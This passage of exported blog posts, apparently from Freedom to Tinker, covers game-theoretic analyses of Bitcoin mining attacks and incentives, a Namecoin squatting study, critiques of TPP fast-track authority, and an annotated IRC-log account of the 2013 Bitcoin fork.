This is obviously an important question, and it’s also well-defined mathematically. We’ve taken all elements of human behavior out of the equation, so we can do some arithmetic to check the answer. Let’s say that initially, blue and red both manage 50% of mining power. For this example, let’s ignore 51% attacks. Illustration of a profitable block-withholding attack. The red pool has 50% of mining power but earns five-ninths of rewards. Now red devotes half its power (25% of the total) to infiltrating blue’s pool, and sends only shares and not blocks to the pool. This means that of all the blocks reaching the Bitcoin network, 2/3 are coming from blue and 1/3 from red. Mining rewards will therefore be distributed between the two pools in the same ratio, 2/3 and 1/3. But of blue’s rewards, blue will pay a third out to red and only keep two-thirds for itself. That’s because red contributes 1/3 of blue’s shares and pools pay out on the basis of shares, not blocks. Recall that blue can’t tell which miners the misbehavior is coming from. In other words, blue keeps four-ninths of global mining rewards, and pays two-ninths out to red. Combined with the one-third that red earns directly, red’s share is five-ninths. This means that block withholding attacks can in theory be profitable, which is an extremely interesting fact on its own. What is mind-boggling, though, is that while people had asked the question for a long time of whether block withholding could be profitable, somehow no one had done the arithmetic presented in the last few paragraphs to discover the answer. The profitability of this attack was first pointed out in a paper by Courtois and Bahack last year that didn’t get much attention. Recently Ittay Eyal analyzed it rigorously, doing some neat game theoretic analysis of a situation with multiple attacking pools, and also brought it to wider attention. This is not the only example of an obvious-in-retrospect break of widely held assumptions about the stability of Bitcoin mining. There’s at least Eyal and Sirer’s selfish mining and Andrew Miller’s feather fork. In each case, miners can potentially gain by deviating from the default protocol. Even though the models of mining used in these analyses are very simple, it took years to spot these bugs. And we can be sure we haven’t found the last of them. I’m using the word bugs for a reason. If you think about the tremendous progress that’s been made in software testing and model checking for finding software bugs and writing correct programs, it’s hard to believe we haven’t found a way to represent Bitcoin’s strategy space in a formal language and automatically probe for deviant strategies. Is it simply a matter of the game theory and Bitcoin research communities having no overlap? Or are the tools developed in game theory for automated analysis of equilibria not capable of handling the domain of Bitcoin mining for some reason? [1] Bitcoin offers an excellent testbed to explore and improve our knowledge of game theory. Due to the large financial incentives at stake, theoretical knowledge about strategies is considered very valuable. And yet, unlike, say, the stock market, the system is “closed” and relatively amenable to modeling and analysis. [2] We’re only slowly starting to exploit this opportunity, and further work in this area can enrich both Bitcoin and game theory. Finally, there’s been little or no evidence of miners employing deviant strategies in practice so far. While this doesn’t in any way diminish the importance of the type of analysis we’ve talked about, it’s important to ask what’s causing the gap between models and observed behavior. I’ll take up this question in the next post. [1] There’s been some work in the Bitcoin community on building mining simulators. This is a different approach, but also an interesting direction. [2] For the system to be closed we have to ignore factors like the impact of mining strategies on the Bitcoin exchange rate. This will be the focus of the next post."
"214","2016-10-21","2023-03-24","https://freedom-to-tinker.com/2016/10/21/bitcoin-is-unstable-without-the-block-reward/","With Miles Carlsten, Harry Kalodner, and Matt Weinberg, I have a new paper titled On the instability of Bitcoin without the block reward, which Harry will present at ACM CCS next week. The paper predicts that miner incentives will start to go haywire as Bitcoin rewards shift from block rewards to transaction fees, based on theoretical results that closely match up with findings from our new Bitcoin mining simulator. Bitcoin provides two incentives for miners: block rewards and transaction fees. Currently the vast majority of miner revenues come from block rewards, but in the long run they will come primarily from transaction fees as block rewards dwindle. This design decision has been discussed a lot, but in terms of monetary policy and hardly ever in terms of security. There has been an implicit belief that the transition to transaction fees will not affect the security and stability of the block chain, and in particular that it is immaterial whether miners receive (say) 25 bitcoins as a fixed reward or 25 bitcoins in expectation via transaction fees. We reexamine this assumption in our paper, and our findings make disturbing news for the future security of Bitcoin and many other cryptocurrencies. Our key insight is that with only transaction fees, the variance of the miner reward is very high due to the randomness of the block arrival time, and it becomes attractive to fork a “wealthy” block to “steal” the rewards therein. [1] The figure shows a scenario where forking might be more profitable than extending the longest chain. See the paper for a full explanation. Here’s how things could go wrong. Due to the possibility of profitable forking, the default strategy is no longer best; we lay out a menagerie of interesting and bizarre strategies in the paper. The most worrisome is “undercutting,” where miners capture as little of the available transaction fees as they can get away with, leaving the rest in the pool as an incentive for the next miner to extend their block rather than a competing block. We also show rigorously that selfish mining gets worse when block rewards are replaced by transaction fees, motivated by the following intuition: if you happen to mine a new block just seconds after the last one was found, you gain nothing by publishing, so you might as well keep it for selfish mining in case you get lucky. The variance in transaction fees enables strategies like this that simply don’t make sense when the block reward is fixed. If miners switch to these deviant strategies, the blockchain will be much less secure because of the mining power wasted due to constant forking, undercutting, and withholding of found blocks. We derive most of our results in two separate ways: analytically, i.e., using game theory, and with a new mining simulator that we created. This gives us added confidence in our findings. For example, in one setting, the theory predicts a rather grotesque equilibrium involving on the Lambert W function, with the proof running to several pages. Sure enough, in our simulations of the same setting, the Lambert miner does best. We hope that our analytical techniques as well as our simulator will be useful to other researchers. We have made the simulator code open-source. What is the impact of our findings? The Bitcoin community will probably need to respond to this problem in the long run, potentially via a fork, to discourage deviant strategies. We aren’t predicting that deviant strategies will arise in the short term, and there is a long runway for mitigation steps to be rolled out. The fact that blocks have filled up due to their 1MB limit decreases the variance of transaction fees between different blocks, and this mitigates the problem somewhat, although it is far from a complete and satisfactory solution. For example, at the time of writing our paper, the previous 1000 blocks included per-block transaction fees ranging from 0.03 BTC to 4.51, with a mean of 0.49 and standard deviation of 0.25 (over half the mean!). So simply maintaining the block-size limit probably won’t resolve the underlying issues. At a deeper level, our results suggest a fundamental rethinking of the role of block rewards in cryptocurrency design. The prevailing view is that the block reward is a necessary but temporary evil to achieve an initial allocation of coins in the absence of a central authority. The transaction-fee regime is seen as the ideal steady state of the system. But our work shows that incentivizing compliant miner behavior in the transaction fee regime is a significantly more daunting task than in the block reward regime. So perhaps designers of new cryptocurrencies should make the block reward permanent and accept monetary inflation as inevitable. Transaction fees would still exist, but merely as an incentive for miners to include transactions in their blocks. One final point: there is a science of designing economic incentives so that rational players will behave in a desired way, and it’s called mechanism design. Creators of cryptocurrencies (as well as creators of applications such as the DAO) are essentially doing mechanism design. But mechanism design is hard, and our paper is the latest among many to point out that the mechanisms embedded in cryptocurrencies have flaws. Yet, sadly, the cryptocurrency community is currently disjoint from the mechanism design community. That is why I’m thrilled that mechanism design expert Matt Weinberg, who’s behind all the sophisticated theory in our paper, is joining Princeton’s faculty next semester. Expect more research from us on the mechanism design of cryptocurrencies! [1] The problems uncover arise not because transaction fees may arrive erratically, but because blocks inevitably arrive unpredictably. We model transaction fees as arriving at a uniform rate. The rate is non-uniform in practice, which is an additional complication. This is a theme throughout our paper: we show that undesirable behaviors will arise even in simplified, “clean” models. This is bad news both because we think things will probably be worse in practice and because we want cryptocurrency mining games to be analytically tractable. Our work shows that in a transaction-fee regime, predicting behavior will be fiendishly complex. Update: see also Bryan Ford’s response to this post (and paper)."
"215","2015-04-17","2023-03-24","https://freedom-to-tinker.com/2015/04/17/the-error-of-fast-tracking-the-trans-pacific-partnership-agreement/","National media reported yesterday that a Congressional agreement has been reached on so-called “fast track” authority for the Trans-Pacific Partnership Agreement (TPP). This international agreement, having been negotiated under extreme secrecy by 12 countries including the United States, Australia, Canada, Japan, Malaysia and Singapore, is supposed to be an “ambitious, next-generation, Asia-Pacific trade agreement that reflects U.S. economic priorities and values.” Indeed, if it comes into effect, it will be the largest such agreement in history, covering some 800 million people. Unfortunately, its chances of meeting that laudable goal have been severely diminished by the aforementioned secrecy. In theory, “fast track” authority should allow the President to more thoroughly and forcefully negotiate trade agreements with other governments by streamlining the domestic political process. By eliminating much of Congress’s review and amendment process that could force the TPP negotiators back to the table, “trade promotion authority” allows for complex international trade agreements to receive a swift and decisive Congressional sign-off. However, because the TPP has been negotiated largely in secret, with only a precious few outside the government (almost exclusively representing the entertainment and pharmaceutical industries) privy to its text, fast track will have the effect of eliminating the last possibility for anyone outside the above select few to change the contours of the agreement. That’s a significant concern, as the TPP (based upon leaks) covers issues ranging from access to medicine to liability for linking to allegedly copyright-infringing content on the Internet. Democracy deserves better. To be sure, even without fast track, the chances of realistically being able to change the TPP once it hits Congress would be slim. Requiring negotiators to go back to the table after the TPP text is agreed upon in international negotiations is a significant undertaking that would be discouraged. But with fast track in place, the chances of offering any meaningful amendments to the final text are near zero. As a result, the moment that TPP’s negotiators announce that they have a final text will also be the effective end of the opportunity for small businesses, labor, civil society groups, and even the general public to impact the provisions of the agreement. Their only play will be to oppose TPP outright (which, in fairness, some may do regardless of how TPP was negotiated). The very secrecy around TPP could be its undoing, as it was with the failed Anti-Counterfeiting Trade Agreement. Therefore, it is well past the time that the negotiators should make the text public. If it isn’t released, and soon, “fast track” could become a fast track to failure of this multi-year negotiating process – which, depending on the terms of the agreement, could be the right result."
"216","2015-05-21","2023-03-24","https://freedom-to-tinker.com/2015/05/21/an-empirical-study-of-namecoin-and-lessons-for-decentralized-namespace-design/","[Let’s welcome to Freedom to Tinker first-year grad student Miles Carlsten, who, with fellow first-years Harry Kalodner and Paul Ellenbogen, worked on a neat study of Namecoin. — Arvind Narayanan] Namecoin is a Bitcoin-like cryptocurrency that aims to create a secure decentralized namespace — that is, an online system that maps names to values, but without the need for a central authority to manage the mappings [1]. In particular, Namecoin focuses on establishing a censorship-resistant alternative to the current centralized Domain Name System (DNS). In a new paper to be presented at WEIS 2015, we report the results of an empirical study of Namecoin. Our primary finding is that so far Namecoin hasn’t succeeded at this goal — out of about 200,000 registered names, only 28 represent non-squatted domains with non-trivial content. We argue that there’s a crucial game-theoretic component to namespaces that must be designed properly for such systems to be successful. What is Namecoin? Namecoin is the first alternative cryptocurrency or “altcoin” to be created based off of the original Bitcoin source code. In addition to standard Bitcoin features such as sending coins, Namecoin includes support for additional operations which allow users to register names and associate values with those names. For example, someone could register the name “john-doe” and associate it with their email address. The Namecoin creators and developers expected the Namecoin name/value store to be used as a censorship-resistant DNS alternative, among other uses. Namecoin (arguably) enables this because it is decentralized, secure, and supports human-memorable names. These three features together are known as Zooko’s triangle, and until a block chain was suggested as the medium for storing name/value mappings, it was conjectured to be impossible for a system to have all three. Our empirical analysis of Namecoin reveals a system in disrepair. Despite its technical merits, Namecoin has failed to achieve its goal of creating an alternative to the current DNS. Our analysis shows that of 196,023 registered domain names in Namecoin, only 28 are nontrivial domains based on the criteria set out in Section 4 of our paper. We found that the vast majority of domains in the system are held by squatters, many of whom use the block chain to advertise that they will sell the names to other users. Of the 745 names that appear to be owned by legitimate users, the vast majority either redirect to regular DNS domains, or offer content that is cloned from an DNS domain. Figure: evidence that most Namecoin domains are controlled by squatters. This plot represents the percentage of names whose value is shared by at least n other names. As we explain in Section 4 of our paper, if a names is associated with a commonly repeated value that typically means it’s squatted, because a squatter copies the same value into all of their names. The plot shows that not only are most names squatted, the majority of names are in fact owned by prolific squatters who control thousands of names. Furthermore, we found that there’s no active market for exchanging names between individuals. We explain in the paper why such a market is an important attribute of a healthy namespace. By analyzing the block chain, we arrived at a lower bound of 14 and an upper bound of about 250 for the total number of transfers of domain names from squatters to regular users that have ever happened. Why study decentralized namespaces? Although Namecoin hasn’t had much adoption, such systems are important and we need more research on namespaces. It’s true that users today aren’t fed up with DNS and aren’t looking to jump ship to censorship-resistant alternatives. But the existence of such alternatives provides a valuable hedge against a potentially abusive central authority. Besides, domain names are just one application of namespaces. Centralized directories for user public keys have fared much less well than DNS, and the service OneName, which we discuss in Section 8 of our paper, is an interesting alternative. Decentralized namespaces could also be applied to trading of digital assets and perhaps even management of existing Internet assets, and the latter is a follow-on research direction that we’re currently pursuing. A conceptual foundation for namespaces. Namecoin didn’t get it right; we need to understand why that is and how to do it better if we were starting afresh. Our key insight is that in addition to the technical details of security, name transfer, etc., a viable namespace has to get the game theory right because there’s inevitably a competition for a valuable resource (names). This requires applying knowledge from the field of mechanism design. In Sections 3 and 6 we lay a conceptual foundation for namespaces. We hope that this will give future designers of namespaces a mental toolbox for thinking about the problem and the design choices. For example, we introduce the idea of a market that has regular users on one side and a distributed “algorithmic agent” on the other side. This distributed agent emerges from the miners executing the protocol, rather than residing on an individual node. Do Namecoin-like systems have a future? Putting aside Namecoin for a minute, let’s look at other systems that aim to repurpose block chains for something other than currency. We see a dichotomy of approaches, reflecting the old debate between putting the application logic into the network versus leaving it to the nodes. On the one hand we have projects like CounterParty and Mastercoin that treat the Bitcoin block chain as a dumb data store and implement all the transaction rules at the nodes. On the other hand we have Ethereum which puts a frightening amount of expressive power (Turing-completeness) into the network itself. Both extremes have downsides. If the block chain is a mere data store, you’re failing to utilize the full value that miners could provide, and you can’t have light-weight client applications. In the context of domain names, this would (roughly) mean that to be able to securely look up a domain name, you need to download and validate the database of all domains ever registered. Ethereum, representing the opposite approach, has a long list of potential problems as well, including development complexity. The ideas behind Namecoin represent an elegant middle ground. But to be viable, such a system should support a broad enough set of uses to be interesting yet narrow enough to be simple and tractable for developers and users. In addition, it needs to get the game theory right. It won’t be easy, but we hope that we haven’t seen the last of this type of cryptocurrency. [1] Terminological note. In computer science, a namespace is simply a container for a set of names, so that names in a single namespace must be unique but the same name can exist in different namespaces. We have chosen to use the term in a related but different way: it’s a system that includes client and server software, users, a mechanism, and so on. In fact, Namecoin contains namespaces in the computer science sense, which we term sub-spaces in our paper."
"217","2015-06-12","2023-03-24","https://freedom-to-tinker.com/2015/06/12/congress-fast-track-to-bad-law/","Congress appears poised to pass Trade Promotion Authority, otherwise known as “fast track,” for the Trans Pacific Partnership Agreement (TPP). If this happens, it will likely close the door to any possibility of meaningful public input about TPP’s scope and contours. That’s a major problem, as this “21st century trade agreement” encompassing around 800 million people in the United States and eleven other countries, will impact areas ranging from access to medicine (who gets it) to digital privacy rights (who has them). But, unless you are a United States Trade Representative (USTR) “cleared advisor” (which almost always means that you represent an industry, like entertainment or pharmaceuticals), or, under certain limited circumstances, an elected official, your chief source of TPP information is WikiLeaks. In other words, if Julian Assange gets his hands on a draft TPP text, you might see it, once he decides that it should be made public. Of course, you’ll have to hope that the copy that you see is current and accurate. There have been no – not one – formal releases of the TPP’s text. Thus, this 21st century agreement has been negotiated with 19th century standards of information access and flow. Indeed, TPP has been drafted with a degree of secrecy unprecedented for issues like intellectual property law and access to information. Some degree of secrecy and discretion is necessary in any negotiation, but the amount of secrecy here has left all but a few groups in the informational dark. This process, if you want to call it that, defies logic. Margot Kaminski has labeled the entire process “transparency theater.” Perhaps most problematically, “transparency theater” has caused widespread opposition to TPP, like mine, that might otherwise not have materialized. Standing alone, the TPP’s negotiation process is sufficient to cause opposition. Additionally, the process has seemingly led to bad substance, which is a separate reason to oppose TPP. Imagine if bills in Congress were treated this way? Meanwhile, fast track will mean that Congress will simply vote yes or no on the entire deal. Therefore, fast track will exacerbate that informational vacuum, and the public will not be able to do much more than accept whatever happens. In essence, an international agreement negotiated with no meaningful public input – and to some unknown degree written by a few industries — is about to be rushed through the domestic legislative process. [Note: I submitted testimony in the case referenced in the previous hyperlink by Yale Law School’s Media Freedom and Information Access Clinic]. At this point, if you are at all concerned about the TPP’s process, the best thing that you can do is contact your Representatives and urge them to vote “no” on fast track. You could also join the call to formally release the TPP’s text before fast track is voted upon (i.e., right now). Finally, you could help assure that two other important international agreements currently in negotiation but in earlier stages – the Transatlantic Trade and Investment Partnership and Trade in Services Agreement – are negotiated more openly. How? By paying attention, and calling your elected officials and the USTR when things remain murky. I’ll have much more to say about these processes in the coming months."
"218","2015-07-28","2023-03-24","https://freedom-to-tinker.com/2015/07/28/analyzing-the-2013-bitcoin-fork-centralized-decision-making-saved-the-day/","On March 11, 2013, Bitcoin experienced a technical crisis. Versions 0.7 and 0.8 of the software diverged from each other in behavior due to a bug, causing the block chain to “fork” into two. Considering how catastrophic a hard fork can be, the crisis was resolved quickly with remarkably little damage owing to the exemplary competence of the developers in charge. The event gives us a never-before-never-again look into Bitcoin’s inner workings. In this post, I’ll do a play-by-play analysis of the dramatic minutes, and draw many surprising lessons. For a summary of the event, see here. First of all, the incident shows the necessity of an effective consensus process for the human actors in the Bitcoin ecosystem. The chronology of events was like this: it took about an hour after the fork started for enough evidence to accumulate that a fork was afoot. Once that was understood, things unfolded with remarkable speed and efficiency. The optimal course of action (and, in retrospect, the only one that avoided serious risks to the system) was first proposed and justified 16 minutes later, and the developers reached consensus on it a mere 20–25 minutes after that. Shortly thereafter — barely an hour after the discovery of the fork — the crisis response had effectively and successfully concluded. It took a few hours more for the fork to heal based on the course of action the developers initiated, but the outcome wasn’t in doubt. More surprisingly, it also shows the effectiveness of strong central leadership. That’s because the commonsense solution to the fork — as well as the one programmed into the software itself — was to encourage miners running old versions to upgrade. As it turns out, the correct response was exactly the opposite. Even a delay of a few hours in adopting the downgrade solution would have been very risky, as I’ll argue, with potentially devastating consequences. Without the central co-ordination of the Bitcoin Core developers and the strong trust that the community places in them, it is inconceivable that adopting this counterintuitive solution could have been successfully accomplished. Further, two more aspects of centralization proved very useful, although perhaps not as essential. The first is the ability of a few developers who possess a cryptographic key to broadcast alert messages to every client, which in this case was used to urge them to downgrade. The second is the fact that the operator of BTC Guild, a large mining pool at the time, was able to singlehandedly shift the balance of mining power to the old branch by downgrading. If it weren’t for this, it would have resulted in a messy “coordination problem” among miners, and we can imagine each one hesitating, waiting for someone else to take the leap. Since most of the discussion and decision-making happened on the #bitcoin-dev IRC channel, it remains publicly archived and offers a remarkable window into the Core developers’ leadership and consensus process. Consensus operated at remarkable speed, in this instance faster than consensus happens in the Bitcoin network itself. The two levels of consensus are intricately connected. Let’s now dive into the play-by-play analysis of the fork and the reaction to it. I’ve annotated the transcript of selected, key events from the IRC log of that fateful night. I’ve made minor edits to make the log easier to read — mainly replacing the nicknames of prominent community members with their real names, since their identities are salient to the discussion. Signs of trouble The first signs that something is wrong come from a miner with nickname thermoman, as well as Jouke Hofman, a Dutch exchange operator, who report strange behavior from their Bitcoin clients. Bitcoin core developer Pieter Wuille helps them debug these problems, but at this point everyone assumes these are problems local to the two users, rather than something on the network. But around 23:00, a variety of other services showing strange behavior are noticed (blockchain.info, blockexplorer.com, and the IRC bot that reports the status of the network), making it obvious that something’s wrong on the network. Luke Dashjr, a prominent developer, spells out the unthinkable:   23:06  Luke Dashjr		so??? yay accidental hardfork? :x
  23:06  Jouke Hofman		Holy crap Over the next few minutes people convince themselves that there’s a fork and that nodes running the 0.8 and the 0.7 versions are on different sides of it. Things progress rapidly from here. A mere five minutes later the first measure to mitigate the damage is taken by Mark Karpeles, founder of Mt. Gox:   23:11  Mark Karpeles		I've disabled the import of bitcoin blocks for now
				until this is sorted out
  23:13  Luke Dashjr		I'm trying to contact poolops [mining pool operators] It’s pretty obvious at this point that the best short-term fix is to get everyone on one side of the fork. But which one? Up or down? The critical decision At 23:18, Pieter Wuille sends a message to the bitcoin-dev mailing list, informing them of the problem. But he hasn’t fully grasped the nature of the fork yet, stating “We risk having (several) forked chains with smaller blocks” and suggests upgrading as the solution. This is unfortunate, but it’s the correct thing to do given his understanding of the fork. This email will stay uncorrected for 45 minutes, and is arguably the only slight misstep in the developer response.   23:21  Luke Dashjr		at least 38% [of hashpower] is on 0.8 right now
				otoh, that 38% is actively reachable Dashjr seems to suggest that the 0.8 → 0.7 downgrade is better because the operators of newly upgraded nodes are more likely to be reachable by the developers to convince them to downgrade. This is a tempting argument. Indeed, when I describe the fork in class and ask my students why the developers picked the downgrade rather than the upgrade, this is the explanation they always come up with. When I push them to think harder, a few figure out the right answer, which Dashjr points out right afterward:   23:22  Gavin Andresen		the 0.8 fork is longer, yes? So majority hashpower is 0.8....
  23:22  Luke Dashjr		Gavin Andresen: but 0.8 fork is not compatible
				earlier will be accepted by all versions Indeed! The behavior of the two versions is not symmetric. Upgrading will mean that the fork will persist essentially indefinitely, while downgrading will end it relatively quickly. (Lead developer) Gavin Andresen still protests, but Wuille also accepts Dashjr’s explanation:   23:23  Gavin Andresen		first rule of bitcoin: majority hashpower wins
  23:23  Luke Dashjr		if we go with 0.8, we are hardforking
  23:23  Pieter Wuille		the forking action is a too large block
				if we ask miners to switch temporarily to smaller blocks again,
				we should get to a single chain soon
				with a majority of miners on small blocks, there is no risk
  23:24  Luke Dashjr		so it's either 1) lose 6 blocks, or 2) hardfork for no benefit
  23:25  BTC Guild		We'll lose more than 6 BTC Guild was a large pool at the time, and its operator happened to be online. They are correct — the 0.8 branch had 6 blocks at the time, but was growing much faster than the 0.7 branch and would continue to grow until the latter gradually caught up. Eventually 24 blocks would be lost. BTC Guild will turn out to be a key player, as we will soon see. More explanation for why downgrade is the right approach:   23:25  Pieter Wuille		all old miners will stick to their own chain
				regardless of the mining power behind the other
  23:25  Luke Dashjr		and the sooner we decide on #1, the fewer it loses
  23:26  Pieter Wuille		even with 90% of mining power on 0.8
				all merchants on an old client will be vulnerable
  23:26  Luke Dashjr		if we hardfork, all Bitcoin service providers have an emergency situation
  23:30  Pieter Wuille		and we _cannot_ get every bitcoin user in the world
				to now instantly switch to 0.8
				so no, we need to rollback to the 0.7 chain Achtung! Many Bitcoin users are not aware of the centralized ability in Bitcoin for a few developers to send out alert messages. Not only does it exist, it becomes crucial here, as Core developer Jeff Garzik and another user point out:   23:31  Jeff Garzik		alert is definitely needed
  23:31  jrmithdobbs		also, if this isn't an alert message scenario
				I don't know what is, where's that at? :) A bit of a comic interlude from the operator of ozcoin, another mining pool:   23:31  Graet			ozcoin wont even get looked at for an hour or so
  23:31  Graet			no-one is avalable and i need to take kids to school The situation is urgent (the more clients upgrade, the harder it will be to convince everyone to downgrade):   23:32  phantomcircuit		0.7 clients are already displaying a big scary warning
				Warning: Displayed transactions may not be correct!
				You may need to upgrade, or other nodes may need to upgrade.
				unfortunately i suspect that warning will get people to upgrade Other complications due to custom behavior of some miners’ software:   23:35  lianj			oh, damn. anyhow please keep us guys updated which code change is made
				to solve the problem. our custom node does .8 behavior Gavin Andresen and Jeff Garzik still aren’t convinced (they seem to be thinking about getting 0.8 nodes to switch to the other branch, rather than the more blunt solution of asking miners to downgrade the client)   23:34  Jeff Garzik		and how to tell bitcoind ""mine on $this old fork""
  23:35  Gavin Andresen		exactly. Even if we want to roll back to the 0.7-compatible chain,
				I don't see an easy way to do that. This shows the usefulness of the developers having direct channels to the pool operators, another benefit of central co-ordination:   23:38  Luke Dashjr		FWIW, Josh (EclipseMC) has to be on a plane in 20 minutes,
				so he needs this decided before then :/ As time goes on the solution only gets harder, as illustrated by a new user wading into the channel.   23:39  senseless		So whats the issue?
				I got the warning you need to upgrade. So I upgraded. Gavin Andresen, notable for his cautious approach, brings up a potential problem:   23:40  Gavin Andresen		If we go back to 0.7, then we risk some other block
				triggering the same condition. Happily, as others pointed out, there’s nothing to worry about — once majority hashpower is on 0.7, other blocks that have the same condition will be harmless one-block forks instead of a hard fork. The BTC guild operator offers to basically end the fork:   23:43  BTC Guild		I can single handedly put 0.7 back to the majority hash power
				I just need confirmation that thats what should be done
  23:44  Pieter Wuille		BTC Guild: imho, that is was you should do,
				but we should have consensus first So much for decentralization! The fact that BTC Guild can tip the scales here is crucial. (The hash power distribution at that time appears to be roughly 2/3 vs 1/3 in favor of the 0.8 branch, and BTC Guild controlled somewhere between 20% and 30% of total hash power.) By switching, BTC Guild loses the work they’ve done on 0.8 since the fork started. On the other hand, they are more or less assured that the 0.7 branch will win and the fork will end, so at least their post-downgrade mining power won’t be wasted. If mining power were instead distributed among thousands of small independent miners, it’s far from clear that coordinating them would be possible at all. More likely, each miner on the 0.8 branch would wait for the 0.7 branch to gain the majority hash power, or at least for things to start heading clearly in that direction, before deciding to downgrade. Meanwhile, some miners in the 0.7 branch, seeing the warning in their clients and unaware of the developer recommendation, would in fact upgrade. The 0.8 branch would pull ahead faster and faster, and pretty soon the window of opportunity would be lost. In fact, if the developers had delayed their decision by even a few hours, it’s possible that enough miners would have upgraded from 0.7 to 0.8 that no single miner or pool operator would be able to reverse it singlehandedly, and then it’s anybody’s guess as to whether the downgrade solution would have worked at all. Back to our story: we’re nearing the critical moment.   23:44  Jeff Garzik		ACK on preferring 0.7 chain, for the moment
  23:45  Gavin Andresen		BTC Guild: if you can cleanly get us back on the 0.7 chain,
				ACK from here, too Consensus is reached! Time for action Right away, developers start giving out advice to downgrade:   23:49  Luke Dashjr		surge_: downgrade to 0.7 if you mine, or just wait
  23:50  Pieter Wuille		doublec: do you operate a pool?
  23:50  doublec		yes
  23:50  Pieter Wuille		doublec: then please downgrade now BTC Guild gets going immediately…   23:51  BTC Guild		BTC Guild is going back to full default block settings and 0.7 soon.
  00:01  BTC Guild		Almost got one stratum node moved … even at significant monetary cost.   23:57  BTC Guild		I've lost way too much money in the last 24 hours
				from 0.8
 One way to look at this is that BTC Guild sacrificed revenues for the good of the network. But these actions can also be justified from a revenue-maximizing perspective. If the BTC Guild operator believed that the 0.7 branch would win anyway (perhaps the developers would be able to convince another large pool operator), then moving first is relatively best, since delaying would only take BTC Guild further down the doomed branch. Either way, the key factor enabling BTC Guild to confidently downgrade is that by doing so, they can ensure that the 0.7 branch will win. Now that the decision has been taken, it’s time to broadcast an alert to all nodes:   00:07  Gavin Andresen		alert params set to relay for 15 minutes, expire after 4 hours The alert in question is a model of brevity: “URGENT: chain fork, stop mining on version 0.8” At this point people start flooding the channel and chaos reigns. However, the work is done, and only one final step remains. At 00:29, Pieter Wuille posts to bitcointalk. This essentially concludes the crisis response. The post said, in its entirety: Hello everyone, there is an emergency right now: the block chain has split between 0.7+earlier and 0.8 nodes. I’ll explain the reasons in a minute, but this is what you need to know now: After a discussion on #bitcoin-dev, it seems trying to get everyone on the old chain again is the least risky solution. If you’re a miner, please do not mine on 0.8 code. Stop, or switch back to 0.7. BTCGuild is switching to 0.7, so the old chain will get a majority hash rate soon. If you’re a merchant: please stop processing transactions until the chains converge. If you’re on 0.7 or older, the client will likely tell you that you need to upgrade. Do not follow this advise – the warning should go away as soon as the old chain catches up If you are not a merchant or a miner, don’t worry. Crucially, note that he was able to declare that the 0.7 branch was going to win due to BTC Guild switching to it. This made the downgrade decision the only rational one for everyone else, and from here things were only a matter of time. What would have happened if the developers had done nothing? Throughout the text I’ve emphasized that the downgrade option was the correct one and that speed of developer response was of the essence. Let’s examine this claim further by thinking about what would have happened if the developers had simply let things take their course. Vitalik Buterin thinks everything would have been just fine: “if the developers had done nothing, then Bitcoin would have carried on nonetheless, only causing inconvenience to those bitcoind and BitcoinQt users who were on 0.7 and would have had to upgrade.” Obviously, I disagree. We can’t know for sure what would have happened, but we can make informed guesses. First of all, the fork would have gone on for far longer — essentially until every last miner running version 0.7 or lower either shut down or upgraded their software. Given that many miners leave their setups unattended and others have custom setups that aren’t easy to upgrade quickly, the fork would have lasted days. This would have several effects. Most obviously, the psychological impact of an ongoing fork would have been serious. In contrast, as events actually turned out, the event happened overnight in the US and had been resolved the next morning, and media coverage praised the developers for their effective action. The price of Bitcoin dropped by 25% during the incident but recovered immediately to almost its previous value. Another adverse impact is that exchanges or payment services that took too long to upgrade their clients (or disable transactions) might find themselves victims of large double-spend attacks. As it happened, OKPay suffered a $10,000 double spend. This was done by a user trying to prove a point and who revealed the details publicly; they got lucky in that their payment to OKPay was confirmed by the 0.8 branch but not 0.7. A longer-running fork would likely have exacerbated the problem and allowed malicious attackers to figure out a systematic way to create double-spend transactions. [1] Worse, it is possible, even if not likely, that the 0.7 branch might have continued indefinitely. Obviously, if this did happen, it would be devastating for Bitcoin, resulting in a fork of the currency itself. One reason the fork might keep going is because of a “Goldfinger attacker” interested in de-stabilizing Bitcoin: they might not have the resources to execute a 51% attack, but the fork might give them just the opportunity they need: they could simply invest resources into keeping the 0.7 fork alive instead of launching an attack from scratch. There’s another reason why the fork might have never ended. Miners who postponed their decision to switch from 0.7 to 0.8 by, say, a week would face the distasteful prospect of forgoing a week’s worth of mining revenue. They might instead gamble and continue to operate on the 0.7 branch as a big fish in a small pond. If the 0.7 branch had, say, 10% of the mining power of the 0.8 branch, the miner’s revenue would be multiplied tenfold by mining on the 0.7 branch. Of course, the currency they’d earn would be “Bitcoin v0.7”, which would fork into a different currency from “Bitcoin v0.8”, and would be worth much less, the latter being considered the legitimate Bitcoin. We analyze this type of situation in Chapter 7, “Community, Politics, and Regulation” of our Bitcoin textbook-in-progress or the corresponding sections of the video lecture. While the exact course of events that would have resulted from inaction is debatable, it is clear that the downgrade solution is by far the less risky one, and the speed and clearheadedness of the developers’ response is commendable. All this is in stark contrast to the dysfunctional state of the consensus process on the block size issue. Why is consensus on that issue failing? The main reason is that unlike the fork, there is no correct solution to the block size issue; instead there are various parties with differing goals that aren’t mutually aligned. Further, in the case of the fork, the developers had a well-honed process for coming to consensus on technical questions including bugs. For example, it was obvious to everyone that the discussion of the fork should take place on the #bitcoin-dev IRC channel; this didn’t even need to be said. On the other hand, there is no clear process for debating the block size issue, and the discussion is highly fragmented between different channels. Finally, once the developers had reached consensus about the fork, the community went with that decision because they trusted the developers’ technical competence. On the other hand, there is no single entity that the Bitcoin community trusts to make decisions that have economic implications. Conclusion In summary, we have a lot to learn from looking back at the fork. Bitcoin had a really close call, and another bug might well lead to a different outcome. Contrary to the view of the consensus protocol as fixed in stone by Satoshi, it is under active human stewardship, and the quality of that stewardship is essential to its security. [2] Centralized decision-making saved the day here, and for the most part it’s not in conflict with the decentralized nature of the network itself. The human element becomes crucial when the code fails or needs to adapt over time (e.g., the block size debate). We should accept and embrace the need for a strong leadership and governance structure instead of treating decentralization as a magic bullet. [1] This gets into a subtle technical point: it’s not obvious how to get a transaction to get into one branch but not the other. By default any transaction that’s broadcast will just get included in both branches, but there are several ways to try to subvert this. But given access to even one transaction that’s been successfully double-spent, an attacker can amplify it to gradually cause an arbitrary amount of divergence between the two branches. [2] To underscore how far the protocol is from being fixed for all time by a specification, the source code of the reference implementation is the only correct documentation of the protocol. Even creating and maintaining a compatible implementation has proved to be near-infeasible. Thanks to Andrew Miller for comments on a draft."
